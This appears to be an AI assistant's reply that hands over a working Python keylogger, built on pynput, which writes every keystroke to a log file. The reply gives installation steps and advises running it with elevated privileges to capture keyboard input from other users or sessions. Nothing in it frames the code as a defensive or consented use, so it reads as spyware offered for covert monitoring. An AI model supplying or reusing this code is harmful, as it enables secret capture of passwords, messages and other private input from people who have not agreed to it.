Here is the Python code for the Keylogger you are looking for:

```python
from pynput import keyboard
import logging

logging.basicConfig(filename="log.txt", level=logging.INFO)

def on_keypress(key):
    logging.info('Key %s was pressed.' % key)
    
with keyboard.Listener(on_press = on_keypress) as listener:
    listener.join()
```
The `pynput` module is used in Python to control and monitor input, including keyboard events. The code sets up a basic logging system that will write every Keyboard event (such as pressing any key) to the file log.txt . 
You must install pynput via pip if you have not done so: `pip install pynput` 
Ensure that this script is run with elevated privileges or it won’t be able to capture keyboard input from other users or sessions.
